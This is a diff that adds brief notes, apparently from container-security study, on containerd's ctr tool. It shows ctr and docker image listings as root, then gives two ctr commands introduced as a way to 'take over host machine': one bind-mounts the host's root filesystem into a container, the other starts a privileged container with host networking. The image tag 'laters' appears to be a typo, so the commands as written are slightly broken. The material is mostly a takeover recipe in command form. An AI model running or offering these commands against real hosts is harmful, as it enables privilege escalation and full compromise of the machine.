@@ -1,0 +1,17 @@
+From below snippit we can see that docker client/daemon and ctr/containerd both store docker images at different places.
+
+[root@server1 ~]# ctr image ls
+REF                        TYPE                                                      DIGEST                                                                  SIZE      PLATFORMS                                                                                                             LABELS 
+docker.io/library/python:3 application/vnd.docker.distribution.manifest.list.v2+json sha256:7a93befe45f3afb6b3377c91ef1e8b28e7b84dc70bbb43fc723415d1ad613bdc 324.5 MiB linux/386,linux/amd64,linux/arm/v5,linux/arm/v7,linux/arm64/v8,linux/mips64le,linux/ppc64le,linux/s390x,windows/amd64 -      
+
+[root@server1 ~]# docker image ls
+REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
+doc-sec      v1        848cf6256b69   2 days ago    267MB
+alpine       latest    021b3423115f   5 days ago    5.6MB
+ubuntu       latest    1318b700e415   2 weeks ago   72.8MB
+
+use ctr utility to create privileged container to take over host machine (download ubuntu image using ctr for better understnding )
+
+1) ctr run --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/ubuntu:laters c1 bash
+2) ctr run --privileged --net-host -t docker.io/library/ubuntu:laters c2 bash
+
